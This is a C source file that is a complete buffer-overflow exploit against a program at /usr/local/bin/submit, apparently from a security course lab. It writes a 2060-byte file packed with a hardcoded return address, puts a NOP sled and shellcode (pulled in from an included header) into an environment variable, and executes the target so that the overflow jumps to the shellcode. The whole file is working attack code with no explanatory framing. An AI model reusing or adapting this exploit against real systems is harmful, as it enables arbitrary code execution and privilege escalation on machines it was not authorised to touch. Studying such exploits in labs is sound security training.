#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define TARGET "/usr/local/bin/submit"
#define BUFFER_SIZE                    2060
#define ENV_SIZE		       2048	 
#define NOP                            0x90


int main(int argc, char *argv[]) {
  int bsize = BUFFER_SIZE;
  int esize = ENV_SIZE;
  
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;

  int i;
  FILE *file;
   
  char *args[4];
  char *env[2];

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(esize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  //Populate buff with the address of the shellcode
  addr = 0xffbfd7e5;  // Address of the environment variable that is set below
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  buff[bsize - 1] = '\0';
  
  //Create a file with the target address that will overflow during copying
  file = fopen("file.txt", "w+");
  fprintf(file, "%s", buff);
  fclose(file);

  //Copy the NOP sled and shellcode into egg
  memset(egg, NOP, esize);
  ptr = egg + 128;
  memcpy(ptr, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  args[1] = "file.txt";
  args[2] = "message"; 
  args[3] = NULL;

  // Pass egg into an environment variable
  env[0] = egg;
  env[1] = NULL;

  execve(TARGET, args, env);

  return 0;
}
